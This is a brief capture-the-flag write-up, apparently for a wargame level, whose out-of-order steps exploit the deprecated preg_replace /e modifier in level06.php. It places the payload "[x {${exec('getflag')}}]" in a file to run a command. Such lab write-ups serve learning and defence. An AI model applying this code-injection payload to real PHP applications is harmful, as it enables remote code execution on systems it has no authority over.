# Steps

1) open level06.php file
3) put the string "[x {${exec('getflag')}}]" into a file in /tmp
2) run level06.php with the new file as argoument, to exploit the function preg_replace("/(\[x (.*)\])/e", "y(\"\\2\")", $a)
